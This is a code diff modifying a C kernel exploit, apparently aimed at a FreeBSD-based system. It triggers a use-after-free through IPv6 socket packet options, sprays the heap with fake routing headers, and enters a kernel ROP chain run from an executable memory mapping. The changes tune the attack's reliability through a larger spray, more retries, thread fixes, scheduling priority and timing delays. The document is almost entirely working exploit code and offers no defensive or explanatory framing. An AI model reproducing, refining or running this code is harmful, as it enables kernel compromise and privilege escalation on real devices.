@@ -1,4 +1,5 @@
-#include <sched.h>  // Added for sched_setscheduler
+#include <sched.h>  // Added for sched_setscheduler if root
+#include <sys/resource.h> // Added for setpriority if root
 #include <sys/types.h>
 #include <stdio.h>
 #include <sys/socket.h>
@@ -22,7 +23,7 @@
 #define TCLASS_MASTER_2 0x73310000
 #define TCLASS_SPRAY 0x41
 #define TCLASS_TAINT 0x42
-#define SPRAY_SIZE 64
+#define SPRAY_SIZE 96
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
 #define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
@@ -108,9 +109,9 @@ void* free_thread(void* arg) {
 
 void trigger_uaf(struct opaque* o) {
     o->triggered = o->padding = o->done1 = o->done2 = 0;
-    int qqq[256];
-    pthread_create(qqq, NULL, use_thread, o);
-    pthread_create(qqq + 128, NULL, free_thread, o);
+    pthread_t th1, th2;
+    pthread_create(&th1, NULL, use_thread, o);
+    pthread_create(&th2, NULL, free_thread, o);
 
     while (1) {
         for (int i = 0; i < SPRAY_SIZE; i++)
@@ -129,18 +130,6 @@ void trigger_uaf(struct opaque* o) {
     printf("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
     o->triggered = 1;
     while (!o->done1 || !o->done2);
-}
-
-
-int build_rthdr_msg(char* buf, int size) {
-    int len = ((size / 8) - 1) & ~1;
-    size = (len + 1) * 8;
-    struct ip6_rthdr* rthdr = (struct ip6_rthdr*)buf;
-    rthdr->ip6r_nxt = 0;
-    rthdr->ip6r_len = len;
-    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
-    rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
-    return size;
 }
 
 // Construct a fake IPv6 routing header
@@ -217,10 +206,14 @@ void pin_to_cpu(int cpu) {
     CPU_ZERO(&set);
     CPU_SET(cpu, &set);
     cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
-    struct sched_param sp = { .sched_priority = 99 }; // Maximum priority for non preempted thread security
-    sched_setscheduler(0, SCHED_FIFO, &sp);
-}
 
+    if (geteuid() == 0) {
+        struct sched_param sp = { .sched_priority = 70 }; // Depends on root access
+        sched_setscheduler(0, SCHED_RR, &sp);
+    } else {
+        setpriority(PRIO_PROCESS, 0, -20); // Alternative if root access is granted
+    }
+}
 
 // External inputs from gadgets and ROP buffers
 void (*enter_krop)(void);
@@ -270,10 +263,12 @@ int main() {
         .kevent_sock = kevent_sock,
         .spray_sock = spray_sock
     };
-    
-// The userland ROP chain is only executed after trigger_uaf() and fake_pktopts() is validated
-    int overlap_idx = -1; 
-    for (int attempts = 0; attempts < 5; attempts++) {
+
+    pthread_t th1, th2;
+    // The userland ROP chain is only executed after trigger_uaf() and fake_pktopts() is validated
+    int overlap_idx = -1;
+    for (int attempts = 0; attempts < 10; attempts++) {
+        // Use valid threads with pthread_t
         trigger_uaf(&o);
         set_tclass(master_sock, TCLASS_TAINT);
 
@@ -315,26 +310,30 @@ int main() {
         set_pktinfo(master_sock, buf2);
         enter_krop();
 
-        break; // Successful exploit
+        break; // Successful exploit run ROP Chain
     }
 
     // Map spray to ROP execution
     char* spray_start = spray_bin;
     char* spray_stop = spray_end;
     char* spray_map = mmap(0, spray_stop - spray_start, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
+    if (spray_map == MAP_FAILED)
+        *(volatile int*)0; // Crash silencioso se mmap falhar
+
     for (size_t i = 0; i < spray_stop - spray_start; i++)
         spray_map[i] = spray_start[i];
 
     // Run malloc sprays for pinned cores
     for (int cpu = 1; cpu < 7; cpu++) {
         pin_to_cpu(cpu);
+        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 µs
         rop_call_funcptr(spray_map, spray_sock, kernel_base);
     }
     for (int cpu = 1; cpu < 7; cpu++) {
         pin_to_cpu(cpu);
+        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 µs
         rop_call_funcptr(spray_map, NULL, kernel_base);
     }
 
     return 0;
 }
-
